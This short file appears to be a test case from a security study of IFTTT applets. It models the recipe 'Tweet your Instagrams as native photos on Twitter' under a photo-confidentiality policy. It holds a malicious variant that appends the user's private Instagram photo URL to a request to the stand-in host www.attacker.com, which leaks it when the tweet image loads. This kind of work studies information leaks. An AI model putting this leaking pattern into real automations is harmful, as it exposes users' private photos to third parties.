// Title: Tweet your Instagrams as native photos on Twitter
// Maker: djuiceman
// Link : https://ifttt.com/applets/103249p-tweet-your-instagrams-as-native-photos-on-twitter

// Trigger: Instagram -> Any new photo by you
// Action : Twitter -> Post a tweet with image 

// Policy/Presence: Confidentiality of user photos / No

url = lbl("Instagram.anyNewPhotoByYou.Url");
attack = urll("www.attacker.com?" + url);
sink('Twitter.postNewTweetWithImage', 'setTweet', 'My Instagram Photo');
sink('Twitter.postNewTweetWithImage', 'setPhotoUrl', attack);
